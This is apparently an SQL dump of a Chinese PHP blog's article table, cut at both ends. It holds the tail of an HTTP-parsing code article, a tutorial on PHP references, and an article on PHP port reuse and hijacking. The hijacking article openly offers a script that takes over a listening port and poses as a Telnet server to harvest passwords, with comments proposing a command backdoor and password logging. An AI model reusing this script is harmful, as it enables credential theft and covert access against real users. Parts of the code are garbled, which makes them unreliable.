style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$body&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;substr&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$body&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$endpos&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;+&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;4&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;// strip filesize at nextline&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$body&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;substr&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$body&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;strpos&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$body&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;\\r\\n&quot;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;) +&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;2&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* Extra the http url&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @param $link&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;private&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;function&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;parseLink&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$link&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;)&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;link&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$link&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;components&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;parse_url&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;link&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;host&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;components&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;colo', 1, 1, 0, 0, 1302534049, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(52, 1, 'PHP下实现端口复用/劫持', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse:collapse;color:#333333;font-family:arial;font-size:14px;line-height:21px;&quot;&gt;假如监听127.0.0.1 ,访问共网IP不受影响，假如监听公网IP，127。0。0。1等IP不受影响。&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n这个可以用于欺骗用户密码，因为原来的服务不可用了。或者留成针对内网用户的后门。&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n最后欢迎加MSN：CQXY[AT]21CN。NET赐教。&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n#!/usr/bin/php -q&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n#c0dz by Darkness[BST]&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n#Team:&lt;a href=&quot;http://www.bugkidz.org/&quot; target=&quot;_blank&quot; id=&quot;url_2&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;text-decoration:none;color:#0070af;&quot;&gt;www.bugkidz.org&lt;/a&gt;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n#E-mail:cqxy[at]21cn.net&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif ($argc != 3 || in_array($argc[1] , array(--help,-h,?)))&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\necho &quot;Use:#./$argv[0]&lt;a href=&quot;http://www.bugkidz.org/&quot; target=&quot;_blank&quot; id=&quot;url_1&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;text-decoration:none;color:#0070af;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0033cc;&quot;&gt;www.bugkidz.org&lt;/span&gt;&lt;/a&gt;192.168.0.1 21 &quot;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\necho &quot;c0dz By Darkness[BST]&quot;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nexit;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nerror_reporting(E_ALL);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nset_time_limit(0);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nob_implicit_flush();&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$host = $argv[1];&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$port = $argv[2];&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) &amp;lt; 0) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\necho &quot;socket_create() failed: reason: &quot; . socket_strerror($sock) . &quot; &quot;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n} /*建立SOCKET*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nsocket_set_option($sock,SOL_SOCKET,SO_REUSEADDR,1); /*设置SOCKET连接的属性为SO_REUSEADDR,这样才可以端口复用*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif (($ret = socket_bind($sock, $host, $port)) &amp;lt; 0) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\necho &quot;socket_bind() failed: reason: &quot; . socket_strerror($ret) . &quot; &quot;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}/*绑定端口*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif (($ret = socket_listen($sock, 5)) &amp;lt; 0) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\necho &quot;socket_listen() failed: reason: &quot; . socket_strerror($ret) . &quot; &quot;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n} /*开始监听*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nwhile(true) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif (($sniffer = socket_accept($sock)) &amp;lt; 0) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\necho &quot;socket_accept() failed: reason: &quot; . socket_strerror($sniffer) . &quot; &quot;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nbreak;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif ($port == 23)&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$txt = &quot;Welcome to the Telnet Server &quot;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$txt .=&quot;User: &quot;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nsocket_write($sniffer, $txt, strlen($txt));&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n} /*这里是伪装信息，把自己伪装成原来的TELNET服务器，这样来骗取密码*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nwhile(true) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif(($buf _read($sniffer&quot;&amp;gt;=@socket_read($sniffer, 2048, PHP_BINARY_READ)) ==false)&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nbreak;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif (!$buf = trim($buf)) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\ncontinue;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif ($buf == !quit) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nbreak;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif ($buf == !shutdown) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nsocket_close($sniffer);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nbreak 2; /*其实这里可以调用system()，搞成一个CMD后门，反正你想怎么改都可以*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$sniff_data = &quot;$buf &quot;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n/* else socket_write($sniffer, $sniff_data, strlen($sniff_data));*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\necho $sniff_data;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n/*输出字符串,这里可以加进文件处理,保存密码什么的*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nsocket_close($sniffer);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nsocket_close($resock);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nsocket_close($sock);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n?&amp;gt;&lt;/span&gt;', 1, 1, 0, 0, 1302534226, 1, 'admin'),
(53, 1, 'php引用(&amp;)详解-php基础', '', '', 'php的引用（就是在变量或者函数、对象等前面加上&amp;amp;符号） &lt;br /&gt;\r\n&lt;br /&gt;\r\n在PHP 中引用的意思是：不同的名字访问同一个变量内容. &lt;br /&gt;\r\n与Ｃ语言中的指针是有差别的．Ｃ语言中的指针里面存储的是变量的内容在内存中存放的地址 &lt;br /&gt;\r\n&lt;br /&gt;\r\n变量的引用 &lt;br /&gt;\r\n&lt;br /&gt;\r\nPHP 的引用允许你用两个变量来指向同一个内容 &lt;br /&gt;\r\n[php] &lt;br /&gt;\r\n&amp;lt;? &lt;br /&gt;\r\n$a=&quot;ABC&quot;; &lt;br /&gt;\r\n$b =&amp;amp;$a; &lt;br /&gt;\r\necho $a;//这里输出:ABC &lt;br /&gt;\r\necho $b;//这里输出:ABC &lt;br /&gt;\r\n$b=&quot;EFG&quot;; &lt;br /&gt;\r\necho $a;//这里$a的值变为EFG 所以输出EFG &lt;br /&gt;\r\necho $b;//这里输出EFG &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n[/php] &lt;br /&gt;\r\n&lt;br /&gt;\r\n函数的传址调用 &lt;br /&gt;\r\n传址调用我就不多说了 下面直接给出代码 &lt;br /&gt;\r\n[php] &lt;br /&gt;\r\nfunction test(&amp;amp;$a) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$a=$a+100; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n$b=1; &lt;br /&gt;\r\necho $b;//输出１ &lt;br /&gt;\r\ntest($b);&amp;nbsp;&amp;nbsp; //这里$b传递给函数的其实是$b的变量内容所处的内存地址，通过在函数里改变$a的值　就可以改变$b的值了 &lt;br /&gt;\r\necho &quot;&amp;lt;br&amp;gt;&quot;; &lt;br /&gt;\r\necho $b;//输出101 &lt;br /&gt;\r\n[/php] &lt;br /&gt;\r\n要注意的是，在这里test(１);的话就会出错，原因自己去想 &lt;br /&gt;\r\n&lt;br /&gt;\r\n函数的引用返回 &lt;br /&gt;\r\n先看代码 &lt;br /&gt;\r\n[php] &lt;br /&gt;\r\nfunction &amp;amp;test() &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nstatic $b=0;//申明一个静态变量 &lt;br /&gt;\r\n$b=$b+1; &lt;br /&gt;\r\necho $b; &lt;br /&gt;\r\nreturn $b; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n&lt;br /&gt;\r\n$a=test();//这条语句会输出　$b的值　为１ &lt;br /&gt;\r\n$a=5; &lt;br /&gt;\r\n$a=test();//这条语句会输出　$b的值　为2 &lt;br /&gt;\r\n&lt;br /&gt;\r\n$a=&amp;amp;test();//这条语句会输出　$b的值　为3 &lt;br /&gt;\r\n$a=5; &lt;br /&gt;\r\n$a=test();//这条语句会输出　$b的值　为6 &lt;br /&gt;\r\n[/php] &lt;br /&gt;\r\n下面解释下：　 &lt;br /&gt;\r\n通过这种方式$a=test();得到的其实不是函数的引用返回，这跟普通的函数调用没有区别　至于原因：　这是ＰＨＰ的规定 &lt;br /&gt;\r\nＰＨＰ规定通过$a=&amp;amp;test(); 方式得到的才是函数的引用返回 &lt;br /&gt;\r\n至于什么是引用返回呢（ＰＨＰ手册上说：引用返回用在当想用函数找到引用应该被绑定在哪一个变量上面时。) 这句狗屁话　害我半天没看懂 &lt;br /&gt;\r\n&lt;br /&gt;\r\n用上面的例子来解释就是 &lt;br /&gt;\r\n$a=test()方式调用函数，只是将函数的值赋给$a而已，　而$a做任何改变　都不会影响到函数中的$b &lt;br /&gt;\r\n而通过$a=&amp;amp;test()方式调用函数呢, 他的作用是　将return $b中的　$b变量的内存地址与$a变量的内存地址　指向了同一个地方 &lt;br /&gt;\r\n即产生了相当于这样的效果($a=&amp;amp;b;) 所以改变$a的值　也同时改变了$b的值　所以在执行了 &lt;br /&gt;\r\n$a=&amp;amp;test(); &lt;br /&gt;\r\n$a=5; &lt;br /&gt;\r\n以后，$b的值变为了5 &lt;br /&gt;\r\n&lt;br /&gt;\r\n这里是为了让大家理解函数的引用返回才使用静态变量的，其实函数的引用返回多用在对象中 &lt;br /&gt;\r\n&lt;br /&gt;\r\n对象的引用 &lt;br /&gt;\r\n[php] &lt;br /&gt;\r\n&amp;lt;? &lt;br /&gt;\r\nclass a{ &lt;br /&gt;\r\nvar $abc=&quot;ABC&quot;; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n$b=new a; &lt;br /&gt;\r\n$c=$b; &lt;br /&gt;\r\necho $b-&amp;gt;abc;//这里输出ABC &lt;br /&gt;\r\necho $c-&amp;gt;abc;//这里输出ABC &lt;br /&gt;\r\n$b-&amp;gt;abc=&quot;DEF&quot;; &lt;br /&gt;\r\necho $c-&amp;gt;abc;//这里输出DEF &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n[/php] &lt;br /&gt;\r\n以上代码是在PHP5中的运行效果 &lt;br /&gt;\r\n在PHP5中 对象的复制 是通过引用来实现的。上列中$b=new a; $c=$b; 其实等效于$b=new a; $c=&amp;amp;$b; &lt;br /&gt;\r\nPHP5中默认就是通过引用来调用对象， 但有时你可能想建立一个对象的副本，并希望原来的对象的改变不影响到副本 . 为了这样的目的，PHP定义了一个特殊的方法，称为__clone. &lt;br /&gt;\r\n&lt;br /&gt;\r\n引用的作用 &lt;br /&gt;\r\n如果程序比较大,引用同一个对象的变量比较多,并且希望用完该对象后手工清除它,个人建议用 &quot;&amp;amp;&quot; 方式,然后用$var=null的方式清除. 其它时候还是用php5的默认方式吧. 另外, php5中对于大数组的传递,建议用 &quot;&amp;amp;&quot; 方式, 毕竟节省内存空间使用。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n取消引用 &lt;br /&gt;\r\n当你 unset 一个引用，只是断开了变量名和变量内容之间的绑定。这并不意味着变量内容被销毁了。例如： &lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n$a = 1; &lt;br /&gt;\r\n$b =&amp;amp; $a; &lt;br /&gt;\r\nunset ($a); &lt;br /&gt;\r\n?&amp;gt;&amp;nbsp; &lt;br /&gt;\r\n&lt;br /&gt;\r\n不会 unset $b，只是 $a。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\nglobal 引用 &lt;br /&gt;\r\n当用 global $var 声明一个变量时实际上建立了一个到全局变量的引用。也就是说和这样做是相同的： &lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n$var =&amp;amp; $GLOBALS[&quot;var&quot;]; &lt;br /&gt;\r\n?&amp;gt;&amp;nbsp; &lt;br /&gt;\r\n&lt;br /&gt;\r\n这意味着，例如，unset $var 不会 unset 全局变量。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n$this &lt;br /&gt;\r\n在一个对象的方法中，$this 永远是调用它的对象的引用。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n//下面再来个小插曲 &lt;br /&gt;\r\nphp中对于地址的指向（类似指针）功能不是由用户自己来实现的，是由Zend核心实现的，php中引用采用的是“写时拷贝”的原理，就是除非发生写操作，指向同一个地址的变量或者对象是不会被拷贝的。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n通俗的讲 &lt;br /&gt;\r\n1:如果有下面的代码 &lt;br /&gt;\r\n[php] &lt;br /&gt;\r\n$a=&quot;ABC&quot;; &lt;br /&gt;\r\n$b=$a; &lt;br /&gt;\r\n[/php] &lt;br /&gt;\r\n其实此时　$a与$b都是指向同一内存地址　而并不是$a与$b占用不同的内存 &lt;br /&gt;\r\n&lt;br /&gt;\r\n２:如果在上面的代码基础上再加上如下代码 &lt;br /&gt;\r\n[php] &lt;br /&gt;\r\n$a=&quot;EFG&quot;; &lt;br /&gt;\r\n[/php] &lt;br /&gt;\r\n由于$a与$b所指向的内存的数据要重新写一次了，此时Zend核心会自动判断　自动为$b生产一个$a的数据拷贝，重新申请一块内存进行存储', 1, 1, 0, 0, 1302672747, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
